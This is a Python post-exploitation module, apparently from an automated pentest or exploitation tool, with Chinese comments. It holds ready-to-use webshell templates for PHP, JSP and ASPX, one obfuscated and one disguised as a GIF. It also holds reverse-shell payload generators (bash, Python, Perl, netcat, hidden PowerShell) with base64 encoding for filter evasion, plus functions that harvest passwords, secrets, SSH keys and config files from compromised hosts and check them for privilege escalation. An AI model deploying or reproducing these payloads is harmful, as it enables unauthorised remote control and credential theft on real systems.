"""后渗透工具集 — WebShell植入/反向Shell/凭证提取"""

from __future__ import annotations

import logging
import urllib.parse

logger = logging.getLogger(__name__)

# ── WebShell 模板 ─────────────────────────────────────────────────────────────

WEBSHELLS = {
    "php_simple": '<?php system($_GET["cmd"]); ?>',
    "php_eval":   '<?php @eval($_POST["cmd"]); ?>',
    "php_bypass": '<?php $f=base64_decode("c3lzdGVt");$f($_GET["c"]); ?>',
    "php_image":  'GIF89a<?php system($_GET["cmd"]); ?>',
    "jsp_simple": '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
    "jsp_output": '''<%@ page import="java.io.*" %>
<%
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
InputStream in = p.getInputStream();
int c; while((c=in.read())!=-1) out.print((char)c);
%>''',
    "aspx_simple": '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]); %>',
}


def generate_webshell(shell_type: str = "php_simple", password: str = "cmd") -> dict:
    """
    生成 WebShell 代码。
    shell_type: php_simple|php_eval|php_bypass|php_image|jsp_simple|jsp_output|aspx_simple
    """
    if shell_type not in WEBSHELLS:
        return {
            "error": f"未知类型: {shell_type}",
            "available": list(WEBSHELLS.keys()),
        }
    code = WEBSHELLS[shell_type]
    ext_map = {
        "php": ".php", "jsp": ".jsp", "aspx": ".aspx",
    }
    lang = shell_type.split("_")[0]
    ext = ext_map.get(lang, ".php")
    return {
        "code": code,
        "suggested_filename": f"shell{ext}",
        "param": password,
        "usage": f"访问 /path/to/shell{ext}?{password}=whoami",
    }


# ── 反向 Shell Payload ────────────────────────────────────────────────────────

def generate_reverse_shell(
    lhost: str,
    lport: int,
    shell_type: str = "bash",
) -> dict:
    """
    生成反向 Shell payload。
    shell_type: bash|python|python3|php|perl|nc|powershell|java
    lhost: 攻击机 IP
    lport: 监听端口
    """
    payloads = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash_196": f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
        "python": (
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);"
            f"os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        ),
        "python3": (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            f"[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
            f"subprocess.call([\"/bin/sh\"])'"
        ),
        "php": (
            f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
        "perl": (
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in($p,inet_aton($i)));"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            f"exec(\"/bin/sh -i\");'"
        ),
        "nc": f"nc -e /bin/sh {lhost} {lport}",
        "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "powershell": (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"\"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
            f"$stream = $client.GetStream();"
            f"[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            f"$sendback = (iex $data 2>&1 | Out-String);"
            f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
            f"$client.Close()\""
        ),
    }

    if shell_type not in payloads:
        return {
            "error": f"未知类型: {shell_type}",
            "available": list(payloads.keys()),
        }

    payload = payloads[shell_type]
    # URL 编码版本（用于 GET 参数注入）
    url_encoded = urllib.parse.quote(payload)
    # Base64 版本（用于绕过过滤）
    import base64
    b64 = base64.b64encode(payload.encode()).decode()

    return {
        "payload": payload,
        "url_encoded": url_encoded,
        "base64": b64,
        "bash_base64_exec": f"echo {b64}|base64 -d|bash",
        "listener_cmd": f"nc -lvnp {lport}",
        "lhost": lhost,
        "lport": lport,
    }


# ── 凭证提取 ──────────────────────────────────────────────────────────────────

async def extract_credentials(
    client,
    url: str,
    method: str = "GET",
    param: str = "cmd",
    shell_type: str = "webshell",
    cookies: dict | None = None,
    headers: dict | None = None,
) -> dict:
    """
    通过已有的命令执行能力提取系统凭证。
    自动执行常见凭证提取命令并返回结果。
    """
    from src.tools.exploit_tools import exec_command

    commands = {
        "whoami":       "whoami",
        "id":           "id",
        "hostname":     "hostname",
        "passwd":       "cat /etc/passwd",
        "shadow_check": "ls -la /etc/shadow",
        "env":          "env | grep -i 'pass\\|key\\|secret\\|token\\|api'",
        "history":      "cat ~/.bash_history 2>/dev/null | tail -20",
        "ssh_keys":     "ls ~/.ssh/ 2>/dev/null",
        "web_configs":  "find /var/www /srv /opt -name '*.conf' -o -name '*.env' -o -name 'config.php' 2>/dev/null | head -10",
        "db_configs":   "find / -name 'wp-config.php' -o -name 'database.yml' -o -name '.env' 2>/dev/null | head -5",
        "sudo":         "sudo -l 2>/dev/null",
        "suid":         "find / -perm -4000 -type f 2>/dev/null | head -20",
        "crontab":      "crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null",
        "network":      "ip addr 2>/dev/null || ifconfig 2>/dev/null",
        "processes":    "ps aux 2>/dev/null | head -20",
    }

    results = {}
    for name, cmd in commands.items():
        r = await exec_command(
            client, url, method, param, cmd,
            shell_type=shell_type,
            headers=headers, cookies=cookies,
        )
        output = r.get("output", r.get("error", ""))
        if output and "error" not in r:
            results[name] = output[:500]

    # 提取关键信息
    findings = []
    for name, output in results.items():
        if any(kw in output.lower() for kw in
               ["password", "passwd", "secret", "key", "token", "api_key"]):
            findings.append({"type": "credential_hint", "source": name, "content": output[:200]})

    return {
        "command_results": results,
        "credential_findings": findings,
        "summary": {
            "whoami": results.get("whoami", "").strip(),
            "hostname": results.get("hostname", "").strip(),
            "has_sudo": "NOPASSWD" in results.get("sudo", ""),
            "suid_count": len(results.get("suid", "").splitlines()),
        },
    }


# ── 文件读取 ──────────────────────────────────────────────────────────────────

async def read_file(
    client,
    url: str,
    filepath: str,
    method: str = "GET",
    param: str = "cmd",
    shell_type: str = "webshell",
    cookies: dict | None = None,
    headers: dict | None = None,
) -> dict:
    """通过命令执行读取目标文件"""
    from src.tools.exploit_tools import exec_command

    cmd = f"cat {filepath}"
    result = await exec_command(
        client, url, method, param, cmd,
        shell_type=shell_type,
        headers=headers, cookies=cookies,
    )
    return {
        "filepath": filepath,
        "content": result.get("output", ""),
        "error": result.get("error", ""),
    }


# ── 权限提升辅助 ──────────────────────────────────────────────────────────────

async def check_privesc(
    client,
    url: str,
    method: str = "GET",
    param: str = "cmd",
    shell_type: str = "webshell",
    cookies: dict | None = None,
    headers: dict | None = None,
) -> dict:
    """检查常见提权向量"""
    from src.tools.exploit_tools import exec_command

    checks = {
        "sudo_nopasswd": "sudo -l 2>/dev/null | grep NOPASSWD",
        "suid_binaries": "find / -perm -4000 -type f 2>/dev/null",
        "writable_passwd": "ls -la /etc/passwd /etc/shadow 2>/dev/null",
        "cron_writable": "ls -la /etc/cron* /var/spool/cron* 2>/dev/null",
        "docker_group": "id | grep docker",
        "lxd_group": "id | grep lxd",
        "capabilities": "getcap -r / 2>/dev/null",
        "kernel_version": "uname -a",
        "os_release": "cat /etc/os-release 2>/dev/null | head -5",
        "path_writable": "echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {} 2>/dev/null | grep -v '^d..x..x..x'",
    }

    results = {}
    vectors = []

    for name, cmd in checks.items():
        r = await exec_command(
            client, url, method, param, cmd,
            shell_type=shell_type,
            headers=headers, cookies=cookies,
        )
        output = r.get("output", "").strip()
        if output and len(output) > 2:
            results[name] = output[:300]

            # 判断是否是可利用的提权向量
            if name == "sudo_nopasswd" and output:
                vectors.append({"type": "sudo_nopasswd", "detail": output})
            elif name == "suid_binaries" and output:
                # 检查已知可提权的 SUID 二进制
                known_suid = ["nmap", "vim", "find", "bash", "more", "less",
                              "nano", "cp", "mv", "python", "perl", "ruby",
                              "awk", "man", "env", "tee", "wget", "curl"]
                for binary in known_suid:
                    if binary in output:
                        vectors.append({"type": "suid", "binary": binary,
                                        "gtfobins": f"https://gtfobins.github.io/gtfobins/{binary}/"})
            elif name == "docker_group" and output:
                vectors.append({"type": "docker_escape", "detail": "用户在 docker 组"})
            elif name == "capabilities" and output:
                vectors.append({"type": "capabilities", "detail": output[:100]})

    return {
        "check_results": results,
        "privesc_vectors": vectors,
        "vector_count": len(vectors),
        "kernel": results.get("kernel_version", ""),
    }
